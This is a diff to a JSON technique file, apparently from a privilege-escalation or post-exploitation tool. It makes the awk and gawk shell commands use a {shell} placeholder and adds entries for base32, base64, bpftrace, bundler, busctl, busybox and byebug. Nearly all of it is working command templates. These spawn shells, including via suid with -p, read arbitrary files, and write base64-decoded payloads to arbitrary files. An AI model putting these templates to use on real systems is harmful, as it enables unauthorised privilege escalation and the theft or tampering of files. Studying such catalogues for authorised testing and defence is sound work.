@@ -60,7 +60,7 @@
 	{
 		"name": "awk",
 		"shell": {
-			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
+			"script": "{command} 'BEGIN {{system(\"{shell}\")}}'"
 		},
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
@@ -71,12 +71,66 @@
 	{
 		"name": "gawk",
 		"shell": {
-			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
+			"script": "{command} 'BEGIN {{system(\"{shell}\")}}'"
 		},
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
 			"type": "base64",
 			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ \"echo \\\"{data}\\\" | base64 -d\" | getline x ; print x > LFILE }}'"
+		}
+	},
+	{
+		"name": "base32",
+		"read_file": "{path} {lfile} | {path} -d"
+	},
+	{
+		"name": "base64",
+		"read_file": "{path} {lfile} | {path} -d"
+	},
+	{
+		"name": "bpftrace",
+		"shell": {
+			"script": "{command} -c {shell} -e 'END {{{{exit()}}}}'", 
+			"suid": ["-p"]
+		}
+	},
+	{
+		"name": "bundler",
+		"shell": {
+			"script": "{command} help",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		}
+	},
+	{
+		"name": "busctl",
+		"shell": {
+			"script": "{command}",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		}
+	},
+	{
+		"name": "busybox",
+		"shell": {
+			"script": "{command} sh"
+		},
+		"read_file": "{path} -c \"cat {lfile}\"",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -c \"echo -n {data} | base64 -d > {lfile}\""
+		}
+	},
+	{
+		"name": "byebug",
+		"shell": {
+			"script": "TF=$(mktemp);echo 'system(\"{shell}\")' > $TF;{command} $TF",
+			"input": "continue\n"
+		},
+		"read_file": "TF=$(mktemp);echo 'system(\"cat {lfile}\")' > $TF;{command} $TF",
+		"write_file": {
+			"type": "base64",
+			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | base64 -d > {lfile}\")' > $TF;{command} $TF"
 		}
 	},
 	{
